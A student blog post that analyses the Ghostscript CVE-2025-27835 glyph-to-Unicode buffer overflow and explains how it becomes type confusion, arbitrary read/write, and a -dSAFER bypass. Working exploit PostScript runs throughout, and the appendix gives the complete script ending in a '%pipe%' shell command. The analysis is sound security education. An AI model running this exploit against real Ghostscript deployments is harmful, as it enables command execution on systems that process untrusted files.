---
author: atch2203
pubDatetime: 2025-10-23
title: Ghostscript CVE-2025-27835 Analysis
featured: false
draft: false
tags:
  - cybersec
description: An analysis of the exploit chain in CVE-2025-27835
---
<style>
img[alt=altText]{
max-height:60vh;
width:auto;
}
</style>

# Some Background
This project was done in a group of 5 people for CS 367 (Reverse Engineering and Exploit Development). **I highly recommend CS 367 for anybody that can take it**, as it teaches how to understand assembly, memory, and exploit chaining at a fundamental level that is generalizable outside of specific frameworks (simple ret2win, house of balls, etc). The class also exercises your ability to think outside the box to construct solutions (and as a small bonus, you'll get a lot of useful real world advice from the GOAT Professor Lurene).

For the final project, our group selected a CVE to analyze and recreate. Since we had some high expectations from the professor (all 5 of our members were in the cybersec club), we decided to go big with a very recent CVE in Ghostscript: CVE-2025-27835.

## What is Ghostscript?
To put it shortly, Ghostscript is a PDF rendering tool and Postscript interpreter that allows you to generate and modify PDF files with Postscript commands. It's used in many applications that deal with PDFs, such as Inkscape, GIMP, LibreOffice, and more. Because of this, Ghostscript is a high valuable target for exploitation.

You can find old releases of Ghostscript at https://github.com/ArtifexSoftware/ghostpdl-downloads/releases. The version our CVE exploits is `10.04.0`.

### Postscript crash course
The exploit code is written in postscript and is run by the Ghostscript interpreter. Because of this, many of the code snippets will look a bit weird.

Postscript is a stack-based language, where each operation is either pushing an item onto the stack or a function. The exploit does not use any complex Postscript functionality, so the following examples are all you'll need:
![altText](@assets/images/ghostscript/ghostscript.png)

### The goal: -dSAFER to -dNOSAFER
[Since version 9.50](https://ghostscript.readthedocs.io/en/gs10.05.0/Use.html#dsafer), Ghostscript defaults to the `-dSAFER` flag, which places controls on file read/write access and shell command execution. As you will see later, the goal of this CVE is "disable" the `-dSAFER` flag by setting the `path_control_active` variable from `1` to `0`, thereby allowing shell commands to be run.

The author of the CVE that we looked at also released several other CVEs in Ghostscript around the same time. 
- [CVE-2025-27835](https://bugs.ghostscript.com/show_bug.cgi?id=708131) - the CVE we examined
- [CVE-2025-27832](https://bugs.ghostscript.com/show_bug.cgi?id=708133)
- [CVE-2025-27831](https://bugs.ghostscript.com/show_bug.cgi?id=708132)
- [CVE-2025-27836](https://bugs.ghostscript.com/show_bug.cgi?id=708192)
- [CVE-2025-27830](https://bugs.ghostscript.com/show_bug.cgi?id=708241)
- [CVE-2025-27833](https://bugs.ghostscript.com/show_bug.cgi?id=708259)
- [CVE-2025-27837](https://bugs.ghostscript.com/show_bug.cgi?id=708238)
- [CVE-2025-27834](https://bugs.ghostscript.com/show_bug.cgi?id=708253)

Looking at the exploit code, they all seem to be doing some magic before finally calling a shell command in the form `(%pipe%id) (w) file`. 

## CVE-2025-27835
> It seems that in the conversion of glyphs to Unicode, there was once a transition from counting in shorts to counting in bytes, and the function `zbfont.c:gs_font_map_glyph_to_unicode` mistakenly copies twice the amount of data. The result is an overflow of the destination buffer.
- zhutyra, PoC author

The vulnerability is simply a buffer overflow in a line in `zbfont.c`. The code incorrectly assumes that length of the unicode string is in shorts and not bytes.
```diff
zbfont.c:gs_font_map_glyph_to_unicode
- memcpy(unicode_return, v->value.const_bytes, l * sizeof(short));
+ memcpy(unicode_return, v->value.const_bytes, l);
```
However, making an exploit for this is not so trivial. We have two questions to answer:
- How do we even get to this vulnerable code with attacker controlled buffers?
- How can we gain control once we utilize this primitive?

As shown in a [short blog post](https://www.cve.news/cve-2025-27835/) about this CVE, to get to the vulnerable code in `zbfont.c`, we need to set the `FontName.Encoding` to use a really large string *in the encoding function*.
```javascript
/* Create a font with a very large glyph name. */
10 dict begin
  /Encoding 256 array def
   1 255 {Encoding exch /.longglyphnamelongglyphnamelongglyphname exch put} for
  /FontType 1 def
  /FontName /ExploitFont def
end
/ExploitFont exch definefont pop

/* Try to use the glyph (triggers conversion) */
newpath 100 100 moveto (A) show
showpage
```

We can also see a similar structure in the exploit (setting a font with a large, except with some special formatting to weaponize this crash:
```javascript
...
/Myfont  
<<  
   /FontName /Myfont  
   /FontType 1  
   /FontMatrix [1 0 0 1 0 0]  
   /Private << /lenIV -1 /Subrs [ <0E> ] >>  
   /Decoding 0  
   /Encoding [ /cs0 /cs1 /cs2 ]  
   /CharStrings <<  
       /.notdef <0E>  
       /cs0 { TEXT 0 1 put /TARGET 312500 array def TARGET REFIDX OBJARR put }  
       /cs1 <0E>  
       /cs2 { DONE }  
   >>  
   ...
>>  
.buildfont1  
/FONT exch def  
/FONTNAME exch def  
  
FONT setfont  

...
  
FONT /FontInfo get /GlyphNames2Unicode get 1 SOURCE1 put  
FONT /CharStrings get /.notdef undef  
TEXT 0 0 put  
TEXT 1 2 put  
0 750 moveto  
TEXT show  
...
```
You can see that instead of making an arbitrarily long string as our overflow, we use a target array and place a target object at a specific index in the array.

I won't go into how this postscript code results in use getting to the vulnerable code path since I mainly focused on getting control from the buffer overflow.

# The fun stuff - from overflow to control
While understanding what causes `zbfont.c` to get called is very specific to ghostscript, the next few parts are more general to rev and exploit dev. In fact, the pattern used from type confusion to arbitrary read and write to control is more common, appearing in chromium exploits as well! 
## Ghostscript references
In addition to a virtual stack, Ghostscript has a virtual heap which it uses to store large items. Each reference in Ghostscript contains both a type, size, and pointer (or data) field. 
- Although not necessary to know for this exploit, these reference structs are universal and are placed literally in the virtual stack, with the ability to represent variable names, values, pointers, and more.

![altText](@assets/images/ghostscript/ghostscript-5.png)
This is different from other languages is that it **stores the type of an object along with its reference**. As we will see later, we can have two references to the same thing with different type fields! This is a key point important to achieving arbitrary read and write.

For the virtual heap, Ghostscript uses a custom allocator that keeps track of all chunks in a doubly linked list (with the metadata right before the data). We will utilize this fact near the end of the exploit.
![altText](@assets/images/ghostscript/ghostscript-9.png)

## The setup before the overflow
Before we get to the buffer overflow, we need to establish
- what we're hitting exactly with the overflow
- what our source is
- what our destination is (and where it is relative to the target)

The exploit defines a bunch of "magic numbers" and structures at the start
```javascript
/REFIDX 249888 def  
/REFOFS 3248640 def  
  
/STROBJ 1000 string def  
/ARROBJ 6250 array def  
/OBJARR 32 array def  
OBJARR 0 STROBJ put  
OBJARR 1 ARROBJ put  
/TARGET null def
```

Additionally, there is a line of code in the font encoding function:
```javascript
/TARGET 312500 array def TARGET REFIDX OBJARR put
```
*This is placed in the encoding function so that `TARGET` is allocated right before the buffer overflow, as we'll see later.*

After this setup, the target structures look like the following.
![altText](@assets/images/ghostscript/ghostscript-1.png)
An important thing to note is that there are two references to the same array (one as an object, and one as an element in an array), meaning that if we overwrite the type of one of the references, we have a type confusion!

Additionally, the following source buffers are set with specific lengths:
```javascript
/TEXT 625000 string def
/SOURCE2 4000002 string def  
/SOURCE1 4000002 string def  
SOURCE2 REFOFS <7e12> putinterval  
  
FONT /FontInfo get /GlyphNames2Unicode get 1 SOURCE1 put
```
###### Some important things to note:
- Most of the target set up
- The reason for 2 source buffers is to control the length of the overflow (`4000002*2`)
	- Our overwrite data `7e12` is placed right at the end of our overflow, which corresponds to the string type
- Similarly, our target is placed at a specific index in an array to line up with the overflow

Here is a comprehensive diagram explaining how each "magic number" is defined and what our overflow is hitting.
![altText](@assets/images/ghostscript/ghostscript-2.png)

If you're wondering why there is empty space between SOURCE1 and SOURCE2, there is a shallow dive at the end of this post.

## The overflow itself
This section is relatively short, since the vulnerability is simply a buffer overflow. Once we try to render text, Ghostscript will call `gs_font_map_glyph_to_unicode` with the buffers set up like above, copying `8000004` bytes from the start of `SOURCE1` to `unicode_buf`, which will go past the end of `unicode_buf` and into `TARGET`. This will overwrite the type of the object in the `TARGET` array, as shown below:
![altText](@assets/images/ghostscript/ghostscript-3.png)
We can also see this in memory:
![altText](@assets/images/ghostscript/ghostscript-4.png)

## Post-overflow: from type confusion to arbitrary read/write
So all we did was change the type of a reference from array to string. What does that change?
**The main difference is in how arrays and strings are accessed**: 
- strings are accessed literally (like `char*` in C)
- accessing an array at an index gives you an object/another reference

**So now we can overwrite the contents of the references in the array!**
For convenience purposes, the exploit keeps string pointers to these references:
```javascript
/* extracts the corrupted object from TARGET (type string, but pointing to same thing as OBJARR) */
/MAGIC TARGET REFIDX get def  
/* string pointing to the pointer for STROBJ (OBJARR[0]) */
/STRPTR MAGIC 8 8 getinterval def  
/* string pointing to the pointer for ARROBJ (OBJARR[1]) */
/ARRPTR MAGIC 24 8 getinterval def
```

In fact, with that ability, we can overwrite the *pointer of a string object (`STROBJ`) in the array* by writing to `STRPTR` and `ARRPTR`! After we overwrite the pointer, we can access `STROBJ` normally by indexing into `OBJARR`. 

![altText](@assets/images/ghostscript/ghostscript-6.png)
You may have noticed that there is still one object we still haven't used - `ARROBJ`. That is the final piece that we will use in the next section to complete the exploit.

The actual postscript code to utilize this is at the end of this post.

## The endgame
We now have complete control over Ghostscript: we have an arbitrary read and write. What do we do with it though?

Recall back to the background section - Ghostscript allows us to execute shell commands if `-dNOSAFER` is active, but by default `-dSAFER` is active. Where is this check stored?
It turns out that there is a `gs_lib_ctx_core_t` object in memory that contains a flag `path_control_active` for whether shell commands and file access is allowed.
![altText](@assets/images/ghostscript/ghostscript-7.png)

###### So how do we locate this struct? 
Since Ghostscript uses a doubly linked list for the heap, we can simply traverse the list! 
Ghostscript helpfully adds a string description for each heap clump (eg `"large object clump"` for objects, `"large string clump"` for strings, or `"gs_lib_ctx_init(core)"` for the object we are looking for), so we can just check this metadata string to know if we found the right object.
![altText](@assets/images/ghostscript/ghostscript-8.png)
```javascript
/* finds the metadata for OBJARR heap clump and verifies that the heap is how we think it is */
{  
   /arrsz 8 string def  

   /next arrptr -40 ptradd -48 ptradd def  
   next 16 ptradd arrsz arbrd  
   arrsz <d886010000000000> eq { exit } if % 100056  

   /next arrptr -56 ptradd -48 ptradd def  
   next 16 ptradd arrsz arbrd  
   arrsz <e886010000000000> eq { exit } if % 100072  

   (unknown header layout) = quit  
} loop
/* traverses through the linked list until we find the right cname_str */
{  
   /head next def  

   /next 8 string def  
   /cname 8 string def  
   /cname_str 21 string def  

   head next arbrd  
   head 32 ptradd cname arbrd  
   cname cname_str arbrd  

   cname_str (gs_lib_ctx_init(core)) eq { exit } if  
} loop
```

Once we locate the struct, we simply overwrite the `path_control_active` int to `0`, and then we are able to run commands!
```javascript
/* writes 0 to a fixed offset of the gs_lib_ctx_init struct if the flag is set */
/ptr1 head 188 ptradd def  
/ptr2 head 204 ptradd def  
ptr1 buf arbrd buf <01000000> eq { ptr1 <00000000> arbwr } if  
ptr2 buf arbrd buf <01000000> eq { ptr2 <00000000> arbwr } if  

/* now we have command execution! */
(%pipe%id) (w) file
```

Unfortunately, this exploit does not clean up after itself! After we try to exit the ghostscript interpreter, it attempts to clean up the heap. However, we overwrote the header of the TARGET array in the heap with all 0s, so it crashes! We didn't have time to figure out how to exit gracefully, but one of the team's members, Richard, looked into it later and found out how to clean up.
![altText](@assets/images/ghostscript/ghostscript-13.png)


%% - TODO link to richard's fixing %%

# Conclusion
There's not much left to say about this exploit, except that our group unknowingly picked a hard exploit and target to analyze. Since our target was an interpreter, it was almost impossible to identify the path the exploit took to get to the vulnerable code (since there were 20 layers of looping interpreter functions before you got to font specific code). Additionally, Ghostscript's custom heap implementation really threw us in a loop, but we were eventually able to understand it.

This whole deep dive was very insightful, and definitely improved not only my debugging and problem solving skills, but also my understanding for exploit patterns and pointer/type fundamentals. While I'm still unsure of whether I'll go into exploit development, these skills transfer very well into almost every other computer science field. If you have free time or are looking for your next project time sink, I'd recommend analyzing public solutions (exploits, tools, products) and seeing how they work - you'll definitely learn a lot, and maybe even write a blog post on it!

# Appendix
## Why is there a gap between SOURCE1 and SOURCE2?
After understanding the type confusion, I looked into figuring out why there was a massive gap in between the `SOURCE1` and `SOURCE2` buffers. Long story short, I examined the memory to find that the clump header contains a hardcoded identifier, and then I stepped through the code to find that the allocator adds a "buffer" space according to the long expression shown below.
![altText](@assets/images/ghostscript/ghostscript-11.png)

![altText](@assets/images/ghostscript/ghostscript-10.png)

We can verify this dynamically to see that the actual allocated size of the strings is around `750000` more bytes than we requested.
![altText](@assets/images/ghostscript/ghostscript-12.png)

The rest of the extra space can be explained by page alignment (they are less than 4096 bytes).

## Arbitrary read and write code snippets
The exploit author made some general functions that are used in most of their Ghostscript exploits. The arbitrary read and write require the type confusion shown earlier.
```javascript
/* simply copies a string from a source to a destination
 it does this by copying 1 byte at a time */
% <dststr> <dstidx> <srcstr> <srcidx> <length> copystr -
/copystr {
    /_length exch def
    /_srcidx exch def
    /_srcstr exch def
    /_dstidx exch def
    /_dststr exch def
    _length {
        _dststr _dstidx _srcstr _srcidx get put
        /_srcidx _srcidx 1 add def
        /_dstidx _dstidx 1 add def
    } repeat
} bind def

/* adds an integer to a 8 byte "string" (pointing to a pointer) and puts it on the stack
   it does so by adding each byte at a time and putting it in a new int */
% <string> <int> ptradd <string>
/ptradd {
    /_inc exch def
    /_ptr exch def
    /_new 8 string def
    0 1 7 {
        /_i exch def
        /_b _ptr _i get _inc add def
        /_inc _b -8 bitshift def
        _new _i _b 255 and put
    } for
    _new
} bind def

/* simple arbitrary read
   overwrites the pointer for STROBJ (OBJARR[0]) and reads from it */
% <string-address> <string-buffer> arbrd -
/arbrd {
    /_buf exch def
    /_adr exch def
    STRPTR 0 _adr 0 8 copystr
    _buf 0 OBJARR 0 get 0 _buf length copystr
} bind def

/* simple arbitrary write
   overwrites the pointer for STROBJ (OBJARR[0]) and writes to it */
% <string-address> <string-data> arbwr -
/arbwr {
    /_buf exch def
    /_adr exch def
    STRPTR 0 _adr 0 8 copystr
    OBJARR 0 get 0 _buf 0 _buf length copystr
} bind def
```

## The whole exploit
Just for completeness, here is the whole exploit:
```javascript
% gs -q -sDEVICE=txtwrite -sOutputFile=/dev/null glyphunicode.ps

500000000 setvmthreshold

/REFIDX 249888 def
/REFOFS 3248640 def

/STROBJ 1000 string def
/ARROBJ 6250 array def
/OBJARR 32 array def
OBJARR 0 STROBJ put
OBJARR 1 ARROBJ put
/TARGET null def

/MAGIC null def
/STRPTR null def
/ARRPTR null def

% <dststr> <dstidx> <srcstr> <srcidx> <length> copystr -
/copystr {
    /_length exch def
    /_srcidx exch def
    /_srcstr exch def
    /_dstidx exch def
    /_dststr exch def
    _length {
        _dststr _dstidx _srcstr _srcidx get put
        /_srcidx _srcidx 1 add def
        /_dstidx _dstidx 1 add def
    } repeat
} bind def

% <string> <int> ptradd <string>
/ptradd {
    /_inc exch def
    /_ptr exch def
    /_new 8 string def
    0 1 7 {
        /_i exch def
        /_b _ptr _i get _inc add def
        /_inc _b -8 bitshift def
        _new _i _b 255 and put
    } for
    _new
} bind def

% <string-address> <string-buffer> arbrd -
/arbrd {
    /_buf exch def
    /_adr exch def
    STRPTR 0 _adr 0 8 copystr
    _buf 0 OBJARR 0 get 0 _buf length copystr
} bind def

% <string-address> <string-data> arbwr -
/arbwr {
    /_buf exch def
    /_adr exch def
    STRPTR 0 _adr 0 8 copystr
    OBJARR 0 get 0 _buf 0 _buf length copystr
} bind def

/DONE {
    /MAGIC TARGET REFIDX get def
    /STRPTR MAGIC 8 8 getinterval def
    /ARRPTR MAGIC 24 8 getinterval def

    (patch) = flush

    /arrptr 8 string def
    arrptr 0 ARRPTR 0 8 copystr

    {
        /arrsz 8 string def

        /next arrptr -40 ptradd -48 ptradd def
        next 16 ptradd arrsz arbrd
        arrsz <d886010000000000> eq { exit } if % 100056

        /next arrptr -56 ptradd -48 ptradd def
        next 16 ptradd arrsz arbrd
        arrsz <e886010000000000> eq { exit } if % 100072

        (unknown header layout) = quit
    } loop

    {
        /head next def

        /next 8 string def
        /cname 8 string def
        /cname_str 21 string def

        head next arbrd
        head 32 ptradd cname arbrd
        cname cname_str arbrd

        cname_str (gs_lib_ctx_init(core)) eq { exit } if
    } loop

    /buf 4 string def
    /ptr1 head 188 ptradd def
    /ptr2 head 204 ptradd def
    ptr1 buf arbrd buf <01000000> eq { ptr1 <00000000> arbwr } if
    ptr2 buf arbrd buf <01000000> eq { ptr2 <00000000> arbwr } if

    (exec) = flush
    (%pipe%id) (w) file

    (done) =
    { 1 pop } loop

    quit
} def  % DONE

/MAIN {

/Myfont
<<
    /FontName /Myfont
    /FontType 1
    /FontMatrix [1 0 0 1 0 0]
    /Private << /lenIV -1 /Subrs [ <0E> ] >>
    /Decoding 0
    /Encoding [ /cs0 /cs1 /cs2 ]
    /CharStrings <<
        /.notdef <0E>
        /cs0 { TEXT 0 1 put /TARGET 312500 array def TARGET REFIDX OBJARR put }
        /cs1 <0E>
        /cs2 { DONE }
    >>
    /WeightVector [1]
    /$Blend {}
    /FontInfo <<
        /BlendAxisTypes [ /foo ]
        /BlendDesignPositions [[1]]
        /BlendDesignMap [[[1]]]
        /GlyphNames2Unicode << >>
    >>
    /Blend <<
        /FontBBox [[1]]
        /Private << >>
    >>
>>
.buildfont1
/FONT exch def
/FONTNAME exch def

FONT setfont

(init) = flush

/TEXT 625000 string def
/SOURCE2 4000002 string def
/SOURCE1 4000002 string def
SOURCE2 REFOFS <7e12> putinterval

FONT /FontInfo get /GlyphNames2Unicode get 1 SOURCE1 put
FONT /CharStrings get /.notdef undef
TEXT 0 0 put
TEXT 1 2 put

(trigger) = flush

0 750 moveto
TEXT show

} def  % MAIN

MAIN
quit
```